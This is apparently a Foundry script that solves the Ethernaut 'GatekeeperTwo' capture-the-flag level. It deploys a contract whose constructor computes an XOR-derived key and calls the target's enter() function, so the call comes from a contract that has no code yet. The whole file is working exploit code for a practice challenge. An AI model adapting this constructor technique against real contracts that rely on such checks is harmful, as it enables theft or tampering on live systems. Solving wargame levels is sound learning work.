// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Solver is Script {
    address gatekeeper_two = vm.envAddress("GATEKEEPERTWO_INSTANCE");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        Solution solution = new Solution(gatekeeper_two);

        vm.stopBroadcast();
    }
}

contract Solution {

    constructor(address gatekeeper_two) {
        bytes8 my_key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gatekeeper_two.call(abi.encodeWithSignature("enter(bytes8)", my_key));
    }
}